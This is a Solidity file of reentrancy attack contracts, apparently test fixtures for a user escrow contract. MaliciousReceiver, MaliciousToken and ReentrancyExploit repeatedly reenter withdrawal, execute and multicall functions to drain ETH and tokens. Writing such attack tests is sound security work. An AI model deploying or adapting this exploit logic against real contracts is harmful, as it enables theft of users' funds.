// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IUserEscrow {
    function withdrawETH(address payable to) external;
    function withdrawToken(address token, address to) external;
    function execute(address target, uint256 value, bytes calldata data) external payable returns (bytes memory);
    function multicall(address[] calldata targets, uint256[] calldata values, bytes[] calldata datas) external payable returns (bytes[] memory);
}

/**
 * @title MaliciousReceiver
 * @dev Contract untuk testing reentrancy attacks via receive() dan fallback()
 */
contract MaliciousReceiver {
    IUserEscrow public target;
    uint256 public attackCount;
    uint256 public maxAttacks;
    bool public isAttacking;

    enum AttackType {
        WITHDRAW_ETH,
        WITHDRAW_TOKEN,
        EXECUTE_CALL,
        MULTICALL,
        NESTED_REENTRANCY
    }

    AttackType public currentAttack;
    address public tokenToSteal;

    event AttackAttempt(AttackType attackType, uint256 count, bool success);
    event ReentrancyDetected(address caller, uint256 value, uint256 balance);

    constructor() {
        maxAttacks = 3;
    }

    function setTarget(address _target) external {
        target = IUserEscrow(_target);
    }

    function setAttackParams(AttackType _type, uint256 _maxAttacks, address _token) external {
        currentAttack = _type;
        maxAttacks = _maxAttacks;
        tokenToSteal = _token;
        attackCount = 0;
    }

    // Reentrancy via receive() when ETH is sent
    receive() external payable {
        emit ReentrancyDetected(msg.sender, msg.value, address(this).balance);

        if (isAttacking && attackCount < maxAttacks) {
            attackCount++;

            try this.executeReentrancyAttack() {
                emit AttackAttempt(currentAttack, attackCount, true);
            } catch {
                emit AttackAttempt(currentAttack, attackCount, false);
            }
        }
    }

    // Reentrancy via fallback() for arbitrary calls
    fallback() external payable {
        // Trigger same reentrancy logic as receive()
        emit ReentrancyDetected(msg.sender, msg.value, address(this).balance);

        if (isAttacking && attackCount < maxAttacks) {
            attackCount++;

            try this.executeReentrancyAttack() {
                emit AttackAttempt(currentAttack, attackCount, true);
            } catch {
                emit AttackAttempt(currentAttack, attackCount, false);
            }
        }
    }

    function executeReentrancyAttack() external {
        require(msg.sender == address(this), "Only self-call allowed");

        if (currentAttack == AttackType.WITHDRAW_ETH) {
            target.withdrawETH(payable(address(this)));
        } else if (currentAttack == AttackType.WITHDRAW_TOKEN) {
            target.withdrawToken(tokenToSteal, address(this));
        } else if (currentAttack == AttackType.EXECUTE_CALL) {
            // Try to call back into escrow via execute
            bytes memory data = abi.encodeWithSignature("withdrawETH(address)", address(this));
            target.execute(address(target), 0, data);
        } else if (currentAttack == AttackType.MULTICALL) {
            // Try to drain via multicall
            address[] memory targets = new address[](2);
            uint256[] memory values = new uint256[](2);
            bytes[] memory datas = new bytes[](2);

            targets[0] = address(target);
            targets[1] = address(target);
            values[0] = 0;
            values[1] = 0;
            datas[0] = abi.encodeWithSignature("withdrawETH(address)", address(this));
            datas[1] = abi.encodeWithSignature("withdrawToken(address,address)", tokenToSteal, address(this));

            target.multicall(targets, values, datas);
        } else if (currentAttack == AttackType.NESTED_REENTRANCY) {
            // Nested reentrancy - call another malicious contract
            this.triggerNestedAttack();
        }
    }

    function triggerNestedAttack() external {
        // Simulate nested reentrancy
        if (attackCount < maxAttacks) {
            target.withdrawETH(payable(address(this)));
        }
    }

    function startAttack() external {
        isAttacking = true;
        attackCount = 0;

        // Initial trigger
        try target.withdrawETH(payable(address(this))) {
            // Attack started
        } catch {
            // Initial call failed
        }
    }

    function stopAttack() external {
        isAttacking = false;
        attackCount = 0;
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Function to simulate malicious contract behavior
    function onTokenTransfer(address, uint256) external pure returns (bool) {
        // Simulate token transfer callback reentrancy
        revert("Malicious token callback");
    }
}

/**
 * @title MaliciousToken
 * @dev Token yang mencoba reentrancy via transfer callbacks
 */
contract MaliciousToken {
    mapping(address => uint256) public balances;
    address public escrowTarget;
    bool public maliciousMode;

    constructor() {
        balances[msg.sender] = 1000000 * 10**18;
    }

    function setMaliciousMode(bool _malicious, address _escrowTarget) external {
        maliciousMode = _malicious;
        escrowTarget = _escrowTarget;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        balances[to] += amount;

        // Malicious callback during transfer
        if (maliciousMode && to == escrowTarget) {
            try IUserEscrow(escrowTarget).withdrawETH(payable(address(this))) {
                // Reentrancy attack via token transfer
            } catch {
                // Attack failed
            }
        }

        return true;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    receive() external payable {}
}

/**
 * @title ReentrancyExploit
 * @dev Advanced reentrancy exploitation contract
 */
contract ReentrancyExploit {
    IUserEscrow public target;
    uint256 public drainedAmount;
    bool public active;

    mapping(bytes4 => bool) public blockedSelectors;

    constructor() {}

    function setTarget(address _target) external {
        target = IUserEscrow(_target);
    }

    function blockSelector(bytes4 selector) external {
        blockedSelectors[selector] = true;
    }

    // Multi-stage reentrancy attack
    function initiateMultiStageAttack() external {
        active = true;

        // Stage 1: Normal withdrawal to trigger receive()
        target.withdrawETH(payable(address(this)));
    }

    receive() external payable {
        drainedAmount += msg.value;

        if (active && address(target).balance > 0) {
            // Stage 2: Try different attack vectors

            // Try execute() reentrancy
            if (!blockedSelectors[bytes4(keccak256("execute(address,uint256,bytes)"))]) {
                try target.execute(
                    address(this),
                    0,
                    abi.encodeWithSignature("maliciousCallback()")
                ) {
                    // Execute succeeded
                } catch {
                    blockedSelectors[bytes4(keccak256("execute(address,uint256,bytes)"))] = true;
                }
            }

            // Try withdrawToken() reentrancy
            if (!blockedSelectors[bytes4(keccak256("withdrawToken(address,address)"))]) {
                try target.withdrawToken(address(0), address(this)) {
                    // WithdrawToken succeeded
                } catch {
                    blockedSelectors[bytes4(keccak256("withdrawToken(address,address)"))] = true;
                }
            }

            // Try direct withdrawETH() reentrancy again
            if (!blockedSelectors[bytes4(keccak256("withdrawETH(address)"))]) {
                try target.withdrawETH(payable(address(this))) {
                    // Recursive withdrawal
                } catch {
                    blockedSelectors[bytes4(keccak256("withdrawETH(address)"))] = true;
                }
            }
        }
    }

    function maliciousCallback() external {
        // Called via execute() - try to drain more funds
        if (address(target).balance > 0) {
            target.withdrawETH(payable(address(this)));
        }
    }

    function stopAttack() external {
        active = false;
    }

    function getDrainedAmount() external view returns (uint256) {
        return drainedAmount;
    }
}